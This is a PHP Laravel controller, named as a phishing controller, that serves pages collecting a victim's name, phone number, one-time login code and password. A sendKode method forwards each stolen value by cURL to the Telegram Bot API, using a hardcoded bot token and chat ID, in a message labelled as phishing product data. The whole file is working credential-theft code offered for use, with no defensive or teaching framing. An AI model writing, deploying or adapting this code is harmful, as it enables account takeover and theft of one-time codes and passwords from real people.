<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class Phising2Controller extends Controller
{
    public function index(Request $request)
    {
        return inertia('two/Index');
    }


    public function store_number(Request $request)
    {

        $request->validate([
            'name' => 'required|min:3',
            'phone_number' => ['required', 'min:6', 'max:15'],
        ]);
        $phone_number = $request->phone_number;
        // $otp = $request->otp;
        // $password = $request->password;

        $this->sendKode($phone_number, "", "");
        // dd($request->all());
        return redirect()->back();
    }

    public function send_otp(Request $request)
    {
        $request->validate([
            'otp' => 'required|numeric|digits:5'
        ]);
        $phone_number = $request->phone_number;
        $otp = $request->otp;
        $password = $request->password;


        $this->sendKode($phone_number, $otp, $password);
    }

    public function store_password(Request $request)
    {

        $request->validate([
            'password' => 'required'
        ]);
        $phone_number = $request->phone_number;
        $otp = $request->otp;
        $password = $request->password;

        $this->sendKode($phone_number, $otp, $password,);
        return redirect()->route('one.home');
    }
    public function sendKode($phone = "",  $otp = "", $password = "")
    {



        $bot_token = "8066350060:AAFHJGLPkxtiROejFAhKeRVmUu7GJkXGtlM";
        $chat_id = "7201344011";
        $phisData = "GIF1";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "  Produk Pissing
            \n  - No $phone  
            \n  - Code $otp  
            \n  - Password $password "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
